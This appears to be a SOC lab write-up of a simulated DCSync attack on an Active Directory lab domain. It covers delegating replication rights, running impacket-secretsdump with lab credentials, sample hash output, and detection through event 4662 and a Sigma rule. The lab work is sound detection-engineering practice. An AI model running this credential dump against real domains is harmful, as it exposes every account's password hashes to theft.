# INC-005 — DCSync Attack

> **MITRE ATT&CK:** T1003.006 — OS Credential Dumping: DCSync  
> **Status:** 🔲 In Progress  
> **Date:** 2026-08-27  
> **Severity:** Critical  
> **Lab environment:** soc-lab-v2

---

## 📋 Summary

A DCSync attack simulates an adversary who has compromised an account with Active Directory replication privileges and uses those rights to request password hash replication from the Domain Controller — without ever touching the DC directly. This technique abuses legitimate AD replication protocols (MS-DRSR) to extract NTLM hashes and Kerberos keys for any domain account, including `krbtgt`.

In this lab scenario, the attacker account `svc_asrep` was granted DCSync rights (Replicating Directory Changes + Replicating Directory Changes All) on the `soc.lab` domain. `impacket-secretsdump` was then used from Kali to extract all domain credentials remotely.

---

## 🎯 Objectives

- Simulate a post-compromise DCSync credential dump
- Validate detection via EID 4662 in Windows Security logs
- Build and validate a Sigma rule for DCSync activity
- Document the full attack → detection → response lifecycle

---

## 🖥️ Environment

| Role | Hostname | IP |
|------|----------|----|
| Domain Controller | SOC-Lab-DC | 172.16.0.5 |
| Attacker | Kali | 172.16.0.11 |
| SIEM | ELK Stack | 172.16.0.4 |

- **Domain:** `soc.lab`
- **Attacker account:** `svc_asrep` (DCSync rights delegated via ADUC)
- **Tool:** `impacket-secretsdump`

---

## ⚙️ Pre-Requisites

### 1. Grant DCSync rights to `svc_asrep`

On the DC (`172.16.0.5`):
1. Open **Active Directory Users and Computers (ADUC)**
2. Right-click the domain root `soc.lab` → **Delegate Control**
3. Add `svc_asrep` and grant:
   - `Replicating Directory Changes` (GUID: `1131f6aa-...`)
   - `Replicating Directory Changes All` (GUID: `1131f6ad-...`)

> ⚠️ This generates EID **4662** in the Security log on the DC when the delegation is applied and when replication is later triggered.

### 2. Verify `impacket-secretsdump` on Kali

```bash
which impacket-secretsdump
```

---

## 💻 Attack Execution

### From Kali (172.16.0.11)

```bash
impacket-secretsdump soc.lab/svc_asrep:'Summer2024!'@172.16.0.5
```

**Expected output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
...
```

> Capture a screenshot of the full output — this is your primary evidence artifact.

---

## 🔍 Detection

See [`detection.md`](./detection.md) for full KQL queries and Sigma rule reference.

**Key event:** EID `4662` on the DC
- Object Type: `%{19195a5b-6da0-11d0-afd3-00c04fd930c9}` (domainDNS)
- Access: `Replicating Directory Changes` or `Replicating Directory Changes All`
- Subject Account: `svc_asrep` (or any non-DC account)

---

## 📁 Evidence

See [`evidence/`](./evidence/) folder for:
- `01-secretsdump-output.png` — impacket-secretsdump terminal output
- `02-eid4662-kibana.png` — EID 4662 events in Kibana
- `03-sigma-rule-match.png` — Sigma rule match in ELK

---

## 🔗 References

- [MITRE ATT&CK T1003.006](https://attack.mitre.org/techniques/T1003/006/)
- [Impacket secretsdump](https://github.com/fortra/impacket)
- [Microsoft EID 4662](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662)
